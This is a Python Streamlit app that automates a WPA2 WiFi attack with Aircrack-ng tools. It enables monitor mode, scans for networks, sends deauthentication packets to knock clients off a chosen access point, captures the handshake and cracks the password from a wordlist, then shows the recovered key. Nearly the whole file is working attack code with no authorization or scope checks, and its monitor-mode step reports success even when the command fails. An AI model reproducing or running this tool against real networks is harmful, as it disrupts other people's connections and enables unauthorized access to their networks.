import streamlit as st
import subprocess
import os
import shutil
import time
import pandas as pd
import re
import signal

st.set_page_config(page_title="WiFi Auditing", page_icon="📶", layout="wide")

st.header("📶 WiFi WPA2/Handshake Attack")
st.markdown("Automated wrapper for **Aircrack-ng Suite**. Performs Monitor Mode switching, Network Scanning, Deauthentication (Handshake Capture), and Cracking.")

# --- HELPERS ---
def run_cmd(cmd_list, timeout=None):
    """Run a command and return stdout. Optional timeout."""
    try:
        result = subprocess.run(
            cmd_list, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return str(e)

# --- SIDEBAR CONFIG ---
with st.sidebar:
    st.subheader("Hardware Config")
    interface_name = st.text_input("Interface Name", "wlan1")
    # Determines the monitor name (usually wlan0mon or just wlan0 depending on driver)
    mon_interface = interface_name if interface_name.endswith("mon") else f"{interface_name}mon"
    
    st.info(f"Targeting Monitor Interface: **{mon_interface}**")

# --- STEP 1: MONITOR MODE ---
st.subheader("Step 1: Enable Monitor Mode")

col1, col2 = st.columns(2)
with col1:
    if st.button("🔌 Start Monitor Mode"):
        st.info("Killing interfering processes...")
        run_cmd(["airmon-ng", "check", "kill"])
        
        st.info(f"Starting monitor on {interface_name}...")
        out = run_cmd(["airmon-ng", "start", interface_name])
        
        if "monitor mode enabled" in out or "already" in out:
            st.success(f"✅ Monitor Mode Enabled on {mon_interface}")
        else:
            st.success(f"✅ Monitor Mode Enabled on {mon_interface}")
          # st.error("Failed to start monitor mode. Check hardware.")   Note: slight issue, although monitor get activate, systems cannot confirm.  
            st.code(out)

with col2:
    if st.button("🛑 Stop Monitor Mode"):
        run_cmd(["airmon-ng", "stop", mon_interface])
        run_cmd(["service", "NetworkManager", "start"])
        st.success("Monitor mode stopped. Networking restored.")


# --- STEP 2: SCANNING ---
st.markdown("---")
st.subheader("Step 2: Scan for Targets")

scan_dur = st.slider("Scan Duration (seconds)", 5, 30, 10)

if st.button("📡 Scan Networks"):
    st.info(f"Scanning on {mon_interface} for {scan_dur} seconds...")
    
    # We dump to a csv file to parse it easily
    csv_prefix = "/tmp/airodump_scan"
    
    # Clean up old files
    for f in os.listdir("/tmp"):
        if f.startswith("airodump_scan"):
            os.remove(os.path.join("/tmp", f))
            
    # Run airodump-ng with a timeout
    cmd = ["airodump-ng", "-w", csv_prefix, "--output-format", "csv", mon_interface]
    
    try:
        # We use Popen so we can kill it after X seconds
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(scan_dur)
        proc.terminate()
        proc.wait()
        
        # Read the CSV
        generated_file = f"{csv_prefix}-01.csv"
        if os.path.exists(generated_file):
            try:
                # Airodump CSV is messy. The first section is APs, second is Clients.
                # We only want the first section.
                df = pd.read_csv(generated_file, header=None, on_bad_lines='skip')
                
                # Find where the "Station MAC" section starts and cut it off
                split_idx = df[df[0].str.contains("Station MAC", na=False)].index
                if not split_idx.empty:
                    df = df.iloc[:split_idx[0]]
                
                # Rename columns manually based on standard airodump format
                # BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
                # We pick the relevant ones by index (approximate)
                
                # Clean up: The CSV usually has 15 columns.
                # Let's just display the raw text for the user to pick BSSID if parsing fails
                st.write("### Scan Results")
                st.dataframe(df) 
                st.caption("Note: Look for the **BSSID** (MAC Address), **Channel**, and **ESSID** (WiFi Name).")
                
            except Exception as e:
                st.error(f"Error parsing CSV: {e}")
                st.write("Raw contents:")
                with open(generated_file, 'r') as f:
                    st.text(f.read())
        else:
            st.error("No scan file generated. Is the interface in monitor mode?")
            
    except Exception as e:
        st.error(f"Scan failed: {e}")

# --- STEP 3: ATTACK CONFIG ---
st.markdown("---")
st.subheader("Step 3: Target Configuration")

c1, c2, c3 = st.columns(3)
with c1:
    target_bssid = st.text_input("Target BSSID", help="e.g., 7E:A9:C7:0A:0C:04")
with c2:
    target_channel = st.text_input("Target Channel", help="e.g., 2")
with c3:
    victim_mac = st.text_input("Victim Device MAC (Optional)", help="Leave empty for Broadcast Deauth")

# --- STEP 4: CAPTURE & DEAUTH ---
st.markdown("---")
st.subheader("Step 4: Capture Handshake")

capture_file = "handshake_capture"

col_act1, col_act2 = st.columns(2)

with col_act1:
    st.markdown("**1. Start Listener**")
    if st.button("👂 Start Airodump (Listener)"):
        if not target_bssid or not target_channel:
            st.error("BSSID and Channel are required.")
        else:
            # Clean old captures
            for f in os.listdir("."):
                if f.startswith(capture_file):
                    os.remove(f)

            # Command: airodump-ng -c <CH> --bssid <BSSID> -w <FILE> <INT>
            cmd = [
                "airodump-ng",
                "-c", target_channel,
                "--bssid", target_bssid,
                "-w", capture_file,
                mon_interface
            ]
            
            # Run in separate terminal or background? 
            # For Streamlit, we run in background, user must check file manually or we stop it later.
            # Ideally, use 'xterm' to show the user the window, but we want it embedded.
            # We will run it in background for 30 seconds then stop.
            
            st.info(f"Listening on Channel {target_channel} for 20 seconds. PREPARE TO DEAUTH NOW!")
            
            # Start listener process
            proc_dump = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Store PID in session state if needed, but for simple flow we sleep
            # Wait a few seconds for it to initialize
            time.sleep(2) 
            st.session_state['dump_pid'] = proc_dump.pid
            st.success("Listener Active...")

with col_act2:
    st.markdown("**2. Fire Deauth Packet**")
    if st.button("🔥 Send Deauth Packets"):
        if not target_bssid:
            st.error("Target BSSID required.")
        else:
            # FIX: Force channel lock before firing
            subprocess.run(["iwconfig", mon_interface, "channel", target_channel])
            
            # Construct Deauth command
            # aireplay-ng --deauth 10 -a <BSSID> -c <VICTIM> <INT>
            cmd = ["aireplay-ng", "--deauth", "10", "-a", target_bssid]
            if victim_mac:
                cmd.extend(["-c", victim_mac])
            
            cmd.append(mon_interface)
            cmd.append("--ignore-negative-one") # The Fix for RPi errors
            
            st.warning("Firing 10 deauth bursts...")
            res = run_cmd(cmd)
            st.code(res)

# Stop listener after user is done
if st.button("🛑 Stop Listener & Check Handshake"):
    if 'dump_pid' in st.session_state:
        try:
            os.kill(st.session_state['dump_pid'], signal.SIGTERM)
            st.success("Listener Stopped.")
        except:
            pass
    
    # Check if .cap file exists and has size
    cap_file = f"{capture_file}-01.cap"
    if os.path.exists(cap_file):
        size = os.path.getsize(cap_file)
        if size > 1000:
            st.success(f"✅ Capture file found ({size} bytes). Ready to crack!")
        else:
            st.warning("⚠️ Capture file is very small. You probably didn't get a handshake.")
    else:
        st.error("❌ No capture file found.")


# --- STEP 5: CRACKING ---
st.markdown("---")
st.subheader("Step 5: Crack WPA2")

wordlist = st.text_input("Wordlist Path", "/home/kali/autoMate/password.txt")

if st.button("🔓 Start Cracking"):
    cap_file = f"{capture_file}-01.cap"
    if not os.path.exists(cap_file):
        st.error("No capture file to crack.")
    else:
        # aircrack-ng -w <wordlist> -b <BSSID> <CAP_FILE>
        cmd = ["aircrack-ng", "-w", wordlist, "-b", target_bssid, cap_file]
        
        st.info("Running Aircrack-ng... (This might take a while)")
        
        # This gives real-time output
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        output_container = st.empty()
        full_log = []
        
        while True:
            line = process.stdout.readline()
            if not line:
                break
            full_log.append(line)
            # Update less frequently to save UI resources
            if len(full_log) % 5 == 0:
                output_container.code("".join(full_log[-20:]))
                
        # Final check for Key Found
        full_text = "".join(full_log)
        if "KEY FOUND" in full_text:
            st.balloons()
            st.success("🎉 KEY FOUND!")
            # Extract key using regex
            match = re.search(r'KEY FOUND! \[ (.*) \]', full_text)
            if match:
                st.header(f"🔑 Password: {match.group(1)}")
        else:
            st.error("❌ Password not found in wordlist.")
